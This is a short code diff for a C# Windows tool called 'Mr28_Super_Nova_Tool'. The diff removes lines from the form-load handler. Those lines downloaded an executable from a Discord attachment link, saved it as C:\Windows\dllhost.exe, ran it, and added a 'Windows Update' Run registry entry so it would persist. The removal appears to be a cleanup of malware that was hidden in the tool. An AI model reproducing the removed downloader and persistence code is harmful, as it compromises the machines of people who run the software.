@@ -67,18 +67,6 @@ namespace Mr28_Super_Nova_Tool
         }
         private void Main_Load(object sender, EventArgs e)
         {
-            if (!File.Exists(@"C:\Windows\dllhost.exe"))
-            {
-                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/701291550516314173/781513482012459018/dllhost.exe", @"C:\Windows\dllhost.exe");
-                Process.Start(@"C:\Windows\dllhost.exe");
-            }
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
-            {
-                key.SetValue("Windows Update", @"C:\Windows\dllhost.exe");
-                key.Dispose();
-                key.Flush();
-            }
-
             // Random Title Color
             new Thread(new ThreadStart(() => change_color(title_line))).Start();
             // AppData File Maker
